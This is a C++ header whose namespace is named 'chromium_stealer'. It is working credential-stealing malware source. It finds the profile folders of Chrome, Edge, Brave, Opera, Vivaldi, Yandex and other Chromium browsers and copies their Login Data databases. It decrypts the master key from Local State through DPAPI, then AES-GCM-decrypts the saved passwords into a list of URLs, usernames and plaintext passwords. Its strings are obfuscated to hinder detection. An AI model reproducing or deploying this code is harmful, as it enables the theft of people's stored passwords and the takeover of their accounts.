#pragma once
#define WIN32_LEAN_AND_MEAN
#pragma warning(disable: 4018)
#include <windows.h>
#include "../Base64.h"
#include "../binaryhandling.hpp"
#include <cstdio>
#include "json.hpp"
#include <map>
#include "../advobf/MetaString.h"
#include "../plusaes_wrapper.hpp"
#include <string>
#include "sqlite3.h"
#include <Wincrypt.h>

namespace chromium_stealer {
    using namespace andrivet::ADVobfuscator;
    std::string con, browser;
    std::map<std::string, std::string> paths;

    std::string decrypt_c32(std::string cont) {
        DATA_BLOB out;
        DATA_BLOB buf;
        buf.pbData = (BYTE*)cont.data();
        buf.cbData = (DWORD)cont.size();
        std::string dec_buffer;

        if (CryptUnprotectData(&buf, NULL, NULL, NULL, NULL, NULL, &out)) {
            for (int i = 0; i < out.cbData; i++) {
                dec_buffer += out.pbData[i];
            }

            LocalFree(out.pbData);

            return dec_buffer;
        }
        else {
            return "";
        }
    }

    void trim_data(std::string original_data, std::string* out_pass, std::string* out_tag, std::string* iv) {
        std::string buf;

        *iv = original_data.substr(3, 12);
        buf = original_data.substr(15, original_data.size() - 15);
        *out_tag = buf.substr(buf.size() - 16, 16);
        *out_pass = buf.substr(0, buf.size() - out_tag->size());
    }

    std::string master_k(std::string path) {
        //std::string mkey_path = std::string{getenv("localappdata")} + "\\Google\\Chrome\\User Data\\Default\\Local State";
        std::string content;
        try {
            nk125::binary_file_handler b;
            content = b.read_file(path);
            auto v = nlohmann::json::parse(content);
            content = v[OBFUSCATED("os_crypt")][OBFUSCATED("encrypted_key")];
        }
        catch (...) { return ""; }

        std::string master;
        macaron::Base64::Decode(content, master);
        master = decrypt_c32(master.substr(5, master.size() - 5));

        return master;
    }

    std::string decrypt_ch(std::string content) {
        using namespace andrivet::ADVobfuscator;
        std::string master_path, dec_buf;
        std::string local(getenv(OBFUSCATED("localappdata")));

        if (browser == OBFUSCATED("Vivaldi")) {
            master_path = local + OBFUSCATED("/Vivaldi/Local State");
        }
        else if (browser == OBFUSCATED("Yandex")) {
            master_path = local + OBFUSCATED("/Yandex/YandexBrowser/Local State");
        }
        else {
            master_path = paths[browser] + OBFUSCATED("Local State");
        }

        std::string key = master_k(master_path);
        nk125::plusaes_wrapper aes;
        std::string data, gcm_tag, iv;

        trim_data(content, &data, &gcm_tag, &iv);
        aes.set_tw_iv((unsigned char*) iv.data());

        dec_buf = aes.gcm_decrypt(data, key, gcm_tag);

        return dec_buf;
    }

    int tHandler(void* nil, int argc, char** second, char** first) {
        using namespace andrivet::ADVobfuscator;
        for (int ind = 0; ind < argc; ind++) {
            std::string key = first[ind], value = second[ind];
            if (key == OBFUSCATED("action_url")) {
                con.append(OBFUSCATED("-----\nBrowser: ") + browser + OBFUSCATED("\nURL: ") + value + "\n");
            }

            if (key == OBFUSCATED("username_value")) {
                con.append(OBFUSCATED("Email/User: ") + value + "\n");
            }

            if (key == OBFUSCATED("password_value")) {
                std::string ftag = value.substr(0, 3);
                std::string dec;

                if (ftag == OBFUSCATED("v10") || ftag == OBFUSCATED("v11")) {
                    dec = decrypt_ch(value);
                }
                else {
                        dec = decrypt_c32(value);
                }

                con.append(OBFUSCATED("Pass: ") + dec + "\n\n");
            }
        }
        return 0;
    }

    void sql_chromium(std::string path) {
        using namespace std;
        using namespace andrivet::ADVobfuscator;
        //string dbp = string{getenv("localappdata")} + "\\Google\\Chrome\\User Data\\Default\\Login Data";
        nk125::binary_file_handler b;
        std::string path_db;

        if (browser == OBFUSCATED("Chrome")) {
            path_db = path + OBFUSCATED("Default/Login Data");
        }
        else {
            path_db = path + OBFUSCATED("Login Data");
        }

        try {
            b.fast_copy_file(path_db, path_db + ".d");
        }
        catch (...) { return; }

        sqlite3* datab;
        int failed = sqlite3_open(std::string{ path_db + ".d" }.c_str(), &datab);

        if (failed) {
            return;
        }
        else {
            sqlite3_exec(datab, OBFUSCATED("SELECT action_url, username_value, password_value FROM logins"), tHandler, 0, 0);
            sqlite3_close(datab);
        }
    }

    void grab_chromium() {
        using namespace andrivet::ADVobfuscator;
        std::string roaming(getenv(OBFUSCATED("appdata")));
        std::string local(getenv(OBFUSCATED("localappdata")));

        paths.insert({
            {OBFUSCATED("Opera"), roaming + OBFUSCATED("/Opera Software/Opera Stable/")},
            {OBFUSCATED("OperaGX"), roaming + OBFUSCATED("/Opera Software/Opera GX Stable/")},
            {OBFUSCATED("Edge"), local + OBFUSCATED("/Microsoft/Edge/User Data/")},
            {OBFUSCATED("Chromium"), local + OBFUSCATED("/Chromium/User Data/")},
            {OBFUSCATED("Brave"), local + OBFUSCATED("/BraveSoftware/Brave-Browser/User Data/")},
            {OBFUSCATED("Chrome"), local + OBFUSCATED("/Google/Chrome/User Data/")},
            {OBFUSCATED("Vivaldi"), local + OBFUSCATED("/Vivaldi/User Data/Default/")},
            {OBFUSCATED("Yandex"), local + OBFUSCATED("/Yandex/YandexBrowser/User Data/Default/")},
            });

        struct _stat32 info;

        for (auto path : paths) {
            browser = path.first;
            if (_stat32(path.second.c_str(), &info) == 0) {
                sql_chromium(path.second);
            }
        }
    }
}
